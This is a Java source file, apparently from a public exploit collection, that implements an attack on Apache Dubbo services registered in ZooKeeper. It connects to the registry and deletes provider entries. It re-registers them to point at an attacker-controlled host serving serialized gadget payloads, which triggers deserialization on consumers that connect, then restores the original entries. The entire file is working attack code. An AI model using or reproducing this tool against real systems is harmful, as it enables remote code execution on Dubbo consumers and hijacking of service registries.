package com.threedr3am.exp.dubbo;

import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;
import org.apache.curator.framework.AuthInfo;
import org.apache.curator.framework.CuratorFramework;
import org.apache.curator.framework.CuratorFrameworkFactory;
import org.apache.curator.retry.RetryNTimes;
import org.apache.zookeeper.CreateMode;

/**
 * @author threedr3am
 */
public class Exploit {

  public void attack(String host, int port, byte[] payload) {
    Socket socket = null;
    try {
      socket = new Socket(host, port);
      OutputStream outputStream = socket.getOutputStream();
      outputStream.write(payload);
      outputStream.flush();
      outputStream.close();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void evil(String zookeeperUri, String scheme, String zookeeperUsername,
      String zookeeperPassword, String rougeHost, int rougePort,
      boolean attackRegister, byte[][] payload, String serialization, long wait) {

    CuratorFrameworkFactory.Builder builder = CuratorFrameworkFactory.builder()
        .connectString(zookeeperUri)
        .retryPolicy(new RetryNTimes(1, 1000))
        .connectionTimeoutMs(3000)
        .sessionTimeoutMs(600000);
    if (zookeeperUsername != null && zookeeperPassword != null && !zookeeperUsername.isEmpty()
        && !zookeeperPassword.isEmpty()) {
      scheme = scheme == null || scheme.isEmpty() ? "auth" : scheme;
      //auth：使用id来进行验证，可以认为是直接传入 userName:passWord 来进行验证
      //digest：也是使用用户名：密码的形式进行验证，不过要对passWord进行MD5哈希，然后再进行bese64。
      AuthInfo authInfo = new AuthInfo(scheme,
          (zookeeperUsername + ":" + zookeeperPassword).getBytes());
      builder.authorization(Arrays.asList(authInfo));
    }
    CuratorFramework client = builder.build();
    if (attackRegister)
      client.start();

    ExecutorService executorService = Executors.newSingleThreadExecutor();
    Runtime.getRuntime().addShutdownHook(new Thread(() -> executorService.shutdown()));
    AtomicInteger againCount = new AtomicInteger(1);
    Map<String, String> data = new HashMap<>();
    Map<String, List<String>> recoverData = new HashMap<>();
    for (int i = 0; i < payload.length; i++) {
      int finalI = i;
      Future future = executorService.submit(() -> {
        try (ServerSocket serverSocket = new ServerSocket(rougePort + finalI)) {
          AtomicInteger attackCount = new AtomicInteger();
          long start = System.currentTimeMillis();
          ExecutorService socketExecutor = Executors.newSingleThreadExecutor();
          socketExecutor.execute(() -> {
            try {
              while (true) {
                Socket socket = null;

                socket = serverSocket.accept();
                OutputStream outputStream = socket.getOutputStream();
                outputStream.write(payload[finalI]);
                outputStream.flush();
                outputStream.close();
                attackCount.getAndIncrement();

              }
            } catch (Exception e) {
              if (e instanceof SocketException) {
                System.err.println("Socket closed");
              } else {
                e.printStackTrace();
              }
            }
          });
          while (System.currentTimeMillis() - start < wait
              || /*暂时不用计数*/attackCount.get() < againCount.get()) {
            ;
          }
          socketExecutor.shutdown();
        } catch (IOException e) {
          e.printStackTrace();
        }
      });
      List<String> clearData = null;
      if (attackRegister) {
        String unique = "/";
        try {
          if (data.isEmpty())
            initData(data, unique, client, recoverData);
        } catch (Exception e) {
          e.printStackTrace();
        }
        againCount.set(data.size());
        clearData = attackRegister(client, data, "dubbo", rougeHost, rougePort + i, serialization);
      }
      System.out.println("attack use gadget[" + i + "]...");
      try {
        future.get();
      } catch (InterruptedException e) {
        e.printStackTrace();
      } catch (ExecutionException e) {
        e.printStackTrace();
      }
      if (clearData != null) {
        clearData.stream().forEach(p -> {
          try {
            client.delete().forPath(p);
          } catch (Exception e) {
            e.printStackTrace();
          }
        });
      }
    }
    for (Map.Entry<String, List<String>> e:recoverData.entrySet()) {
      e.getValue().forEach(item -> {
        try {
          client.create().withMode(CreateMode.EPHEMERAL).forPath(e.getKey() + "/" + item);
        } catch (Exception ex) {
          ex.printStackTrace();
        }
      });
    }

  }

  private List<String> attackRegister(CuratorFramework client,
      Map<String, String> data, String scheme, String rougeHost, final int rougePort,
      String serialization) {
    List<String> clearData = new ArrayList<>();
    data.entrySet().forEach(d -> {
      String pathParent = d.getKey();
      String path = d.getValue();
      try {
        if (client.checkExists().forPath(pathParent + "/" + path) != null)
          client.delete().forPath(pathParent + "/" + path);
      } catch (Exception e) {
        e.printStackTrace();
      }
      String pathForDecode = URLDecoder.decode(path);
      pathForDecode = pathForDecode
          .replaceAll("dubbo://.+?/", scheme + "://" + rougeHost + ":" + rougePort + '/');
      pathForDecode = pathForDecode.replaceAll("serialization=.+?&", "");
      pathForDecode = pathForDecode + (pathForDecode.endsWith("&") ? "" : "&") + "serialization="
          + serialization;
      String rougePathForEncode = URLEncoder
          .encode(pathForDecode);
      try {
        client.create().withMode(CreateMode.EPHEMERAL)
            .forPath(pathParent + "/" + rougePathForEncode);
      } catch (Exception e) {
        e.printStackTrace();
      }
      clearData.add(pathParent + "/" + rougePathForEncode);
    });
    return clearData;
  }

  private void initData(Map<String, String> data, String unique,
      CuratorFramework client, Map<String, List<String>> recoverData) throws Exception {
    List<String> all = client.getChildren().forPath(unique);
    for (String i : all) {
      String uniqueChildren = unique + (unique.length() != 1 ? "/" : "") + i;
      if (i.equals("providers")) {
        makeData(data, uniqueChildren, client, recoverData);
        continue;
      }
      initData(data, uniqueChildren, client, recoverData);
    }
  }

  private void makeData(Map<String, String> data, String provider, CuratorFramework client,
      Map<String, List<String>> recoverData)
      throws Exception {
    List<String> all = client.getChildren().forPath(provider);
    if (all.size() > 0) {
      recoverData.put(provider, all);
      data.put(provider, all.get(0));
    }
  }

}
